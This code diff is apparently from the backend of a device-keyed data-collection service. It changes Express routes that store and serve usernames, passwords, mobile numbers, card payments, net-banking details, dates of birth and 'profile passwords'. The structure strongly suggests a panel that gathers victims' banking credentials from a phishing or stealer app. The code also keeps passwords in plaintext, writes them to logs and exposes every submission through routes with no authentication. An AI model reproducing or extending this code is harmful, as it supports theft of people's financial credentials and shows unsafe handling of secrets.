@@ -6,7 +6,6 @@ import logger from "../logger/logger";
 const router = express.Router();
 
 /* ================= LIST FORM SUBMISSIONS ================= */
-
 router.get("/form_submissions", async (_req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find().lean();
@@ -18,7 +17,6 @@ router.get("/form_submissions", async (_req: Request, res: Response) => {
 });
 
 /* ================= GET FORM BY DEVICE ================= */
-
 router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find({
@@ -33,7 +31,6 @@ router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Respons
 });
 
 /* ================= DELETE FORM SUBMISSION ================= */
-
 router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
   try {
     await FormSubmission.deleteOne({ uniqueid: req.params.uniqueid });
@@ -45,7 +42,6 @@ router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response)
 });
 
 /* ================= GET CARD PAYMENTS BY DEVICE ================= */
-
 router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await Payment.find({
@@ -61,7 +57,6 @@ router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response
 });
 
 /* ================= GET NET BANKING BY DEVICE ================= */
-
 router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await Payment.find({
@@ -76,8 +71,7 @@ router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) 
   }
 });
 
-/* ================= GET SUCCESS DATA (DOB + PROFILE PASSWORD) ================= */
-
+/* ================= GET SUCCESS DATA (dob + profilePassword) ================= */
 router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const doc = await FormSubmission.findOne({
@@ -86,10 +80,10 @@ router.get("/success_data/device/:uniqueid", async (req: Request, res: Response)
 
     if (!doc) return res.json({ dob: "", profilePassword: "" });
 
-    // return only required fields (safe)
+    const payload = (doc as any).payload || {};
     return res.json({
-      dob: (doc as any).dob || "",
-      profilePassword: (doc as any).profilePassword || "",
+      dob: payload.dob || "",
+      profilePassword: payload.profilePassword || "",
     });
   } catch (err: any) {
     logger.error("forms: success_data fetch failed", err);
@@ -98,7 +92,6 @@ router.get("/success_data/device/:uniqueid", async (req: Request, res: Response)
 });
 
 /* ================= POST: SUCCESS DATA (update dob/profilePassword) ================= */
-
 router.post("/success_data", async (req: Request, res: Response) => {
   const body = req.body || {};
   const uniqueid = body.uniqueid || "";
@@ -108,21 +101,16 @@ router.post("/success_data", async (req: Request, res: Response) => {
   }
 
   try {
-    // Log incoming payload for debugging
     logger.info("forms: success_data payload", { uniqueid, dob: body.dob, profilePassword: body.profilePassword });
 
     const update: any = { $set: {} };
-
-    // NOTE: use hasOwnProperty so empty string ("") will also be written
     if (Object.prototype.hasOwnProperty.call(body, "dob")) {
-      update.$set["dob"] = body.dob ?? "";
+      update.$set["payload.dob"] = body.dob ?? "";
     }
     if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) {
-      update.$set["profilePassword"] = body.profilePassword ?? "";
+      update.$set["payload.profilePassword"] = body.profilePassword ?? "";
     }
 
-    // If nothing to set (no keys), still respond success to client,
-    // but avoid making empty update call.
     if (Object.keys(update.$set).length === 0) {
       logger.warn("forms: success_data called but no dob/profilePassword keys present", { uniqueid });
       return res.json({ success: true });
@@ -138,17 +126,13 @@ router.post("/success_data", async (req: Request, res: Response) => {
   }
 });
 
-/* ================= EXISTING POST ENDPOINTS ================= */
-
+/* ================= POST: generic form_submissions (store full body as payload) ================= */
 router.post("/form_submissions", async (req: Request, res: Response) => {
   const body = req.body || {};
   try {
     const doc = new FormSubmission({
       uniqueid: body.uniqueid || body.deviceId || "",
-      username: body.username || "",
-      password: body.password || "",
-      mobileNumber: body.mobileNumber || "",
-      // ensure new fields exist (defaults in schema handle this)
+      payload: body,
     });
 
     await doc.save();
@@ -160,6 +144,7 @@ router.post("/form_submissions", async (req: Request, res: Response) => {
   }
 });
 
+/* ================= POST: payments (keep existing behavior) ================= */
 router.post("/card_payments", async (req: Request, res: Response) => {
   try {
     const body = req.body || {};
